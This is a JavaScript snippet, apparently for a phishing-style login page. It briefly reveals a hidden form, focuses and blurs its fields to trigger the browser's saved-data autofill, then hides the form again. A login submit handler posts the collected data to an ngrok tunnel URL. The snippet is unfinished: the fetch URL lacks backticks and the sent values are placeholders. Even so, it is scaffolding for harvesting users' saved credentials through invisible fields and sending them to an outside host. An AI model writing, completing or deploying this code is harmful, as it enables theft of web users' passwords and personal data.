// ngrok URL - Replace this with your current ngrok URL
const ngrokUrl = 'https://d5f2-102-68-79-243.ngrok-free.app';

// Function to send form data to the local server via ngrok
function sendFormData(data) {
    fetch(${ngrokUrl}/api/user-inputs, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(data => {
        console.log('Success:', data);
    })
    .catch(error => {
        console.error('Error:', error);
    });
}

// Function to trigger hidden form autofill
function triggerAutofill() {
    const hiddenForm = document.getElementById('hiddenForm');
    hiddenForm.style.display = 'block';

    const fields = hiddenForm.querySelectorAll('input');
    fields.forEach(field => {
        field.focus();  // Simulate focus to trigger browser autofill
        field.blur();   // Blur to simulate completing the autofill process
    });

    setTimeout(() => {
        hiddenForm.style.display = 'none';  // Hide the form after 1 second
    }, 1000);

    alert('Autofill triggered!');
}

// Add event listener for form submission
document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent default form submission

    // Collect form data (currently no fields in your form, adjust as needed)
    const data = {
        // Example data - update with actual form data if needed
        exampleField1: 'value1', // Replace with actual field names and values
        exampleField2: 'value2'  // Replace with actual field names and values
    };

    // Send data to server via ngrok
    sendFormData(data);
});